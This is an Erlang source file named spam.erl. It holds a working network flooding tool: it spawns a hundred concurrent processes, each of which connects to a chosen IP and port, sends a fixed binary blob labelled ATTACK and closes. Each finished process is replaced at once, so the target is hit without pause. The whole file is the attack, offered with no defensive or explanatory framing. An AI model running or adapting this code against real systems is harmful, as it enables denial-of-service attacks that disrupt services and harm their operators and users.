%%%-------------------------------------------------------------------
%%% File    : spam.erl
%%% Author  : Olle Mattsson <olle@zubat>
%%% Description : 
%%%
%%% Created : 16 May 2009 by Olle Mattsson <olle@zubat>
%%%-------------------------------------------------------------------
-module(spam).

-compile(export_all).


-define(ATTACK, <<149,0,170,66,20,164,1,1,0,72,3,122,96,61,73,124,78,61,73,120,65,20,73,37,57,154,73,78,234,86,177,8,129,15,239,214,62,19,182,75,192,69,93,37,108,134,86,145,14,36,41,191,224,229,130,226,33,252,117,253,160,179,173,190,177,77,133,177,43,214,152,22,101,17,95,195,137,196,20,175,27,79,201,108,128,56,60,254,118,98,133,75,207,99,210,140,7,27,216,104,229,42,63,236,133,78,171,197,121,237,83,40,157,23,40,150,223,151,60,104,173,45,201,160,238,178,54,227,99,120,186,39,195,152,121,6,98,147,1,74,199,166,65,125,9,199,118,146,120,204,190>>).

spam(Ip, Port) ->
    spam(Ip, Port, 100, []).

spam(Ip, Port, 0, Pids) ->
    process_flag(trap_exit, true),
    spam_loop(Ip, Port,Pids);
spam(Ip, Port, Procs, Pids) ->
    Pid = spawn_link(?MODULE, spam_connect, [Ip, Port]),
    spam(Ip, Port, Procs-1, [{Pid}|Pids]).




spam_connect(Ip, Port) ->
    case gen_tcp:connect(Ip, Port, [binary]) of
	{ok, Sock} ->
 	    gen_tcp:send(Sock,?ATTACK),
	    gen_tcp:close(Sock),
	    exit(connected);
	{error, _Reason} ->
	    exit(not_connected)
    end.



spam_loop(Ip, Port,Pids) when length(Pids) < 100 ->
    Pid = spawn_link(?MODULE, spam_connect, [Ip, Port]),
    spam_loop(Ip, Port,[Pid|Pids]);

spam_loop(Ip, Port,Pids) ->
    receive
	{'EXIT', Pid, _} ->
	    Pid2 = spawn_link(?MODULE, spam_connect, [Ip, Port]),
	    spam_loop(Ip, Port, lists:keystore(Pid, 1, Pids, {Pid2}));
	Any ->
	    io:format("Any, ~p\n", [Any]),
	    spam_loop(Ip, Port, Pids)
    end.
    
